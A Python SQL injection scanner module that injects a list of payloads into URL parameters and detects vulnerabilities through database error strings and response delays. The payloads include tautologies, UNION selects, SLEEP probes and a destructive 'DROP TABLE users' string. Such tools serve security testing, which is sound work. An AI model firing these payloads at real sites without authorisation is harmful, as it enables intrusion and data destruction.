import aiohttp
from typing import Dict, List
import re

class SQLInjectionScanner:
    """Advanced SQL Injection detection module"""
    
    def __init__(self):
        self.payloads = [
            "'",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR 1=1--",
            "'; DROP TABLE users--",
            "' UNION SELECT NULL--",
            "' UNION SELECT 1,2,3--",
            "admin'--",
            "' OR 1=1 LIMIT 1--",
            "'; SELECT * FROM users--",
            "' AND SLEEP(5)--",
            "' OR SLEEP(5)--",
            "1' AND SLEEP(5)--",
            "1' OR SLEEP(5)--"
        ]
        
        self.error_patterns = [
            r"mysql_fetch",
            r"mysql_error",
            r"PostgreSQL",
            r"SQL syntax",
            r"Unclosed quotation mark",
            r"Microsoft OLE DB",
            r"ORA-[0-9]{5}",
            r"SQLite",
            r"Warning: mysql",
            r"unexpected T_STRING",
            r"Stack trace:",
            r"DivisionByZeroError"
        ]
    
    async def scan(self, url: str, request_handler) -> Dict:
        """Scan for SQL injection vulnerabilities"""
        results = {
            'vulnerable': False,
            'vulnerabilities': [],
            'tested_payloads': 0,
            'response_time': 0
        }
        
        # Extract all parameters from URL
        params = self._extract_params(url)
        
        for param in params:
            for payload in self.payloads:
                test_url = self._inject_payload(url, param, payload)
                
                try:
                    response = await request_handler.get(test_url)
                    results['tested_payloads'] += 1
                    
                    # Check for SQL errors
                    if self._check_sql_errors(response.text):
                        results['vulnerable'] = True
                        results['vulnerabilities'].append({
                            'type': 'SQL Injection',
                            'severity': 'critical',
                            'parameter': param,
                            'payload': payload,
                            'location': test_url,
                            'description': f"SQL Injection vulnerability detected in parameter '{param}'",
                            'remediation': "Use parameterized queries/prepared statements, implement input validation, and use an ORM"
                        })
                    
                    # Time-based detection
                    if 'SLEEP' in payload:
                        if response.elapsed.total_seconds() > 4:
                            results['vulnerable'] = True
                            results['vulnerabilities'].append({
                                'type': 'Time-based SQL Injection',
                                'severity': 'critical',
                                'parameter': param,
                                'payload': payload,
                                'location': test_url,
                                'description': "Time-based SQL injection detected",
                                'remediation': "Implement proper input sanitization and use parameterized queries"
                            })
                            
                except Exception as e:
                    continue
        
        return results
    
    def _extract_params(self, url: str) -> List[str]:
        """Extract query parameters from URL"""
        params = []
        if '?' in url:
            query = url.split('?')[1]
            for param in query.split('&'):
                params.append(param.split('=')[0])
        return params
    
    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        """Inject payload into URL parameter"""
        if '?' in url:
            base_url = url.split('?')[0]
            params = url.split('?')[1].split('&')
            
            new_params = []
            for p in params:
                if p.startswith(f"{param}="):
                    new_params.append(f"{param}={payload}")
                else:
                    new_params.append(p)
            
            return f"{base_url}?{'&'.join(new_params)}"
        return url
    
    def _check_sql_errors(self, response_text: str) -> bool:
        """Check for SQL error patterns in response"""
        for pattern in self.error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False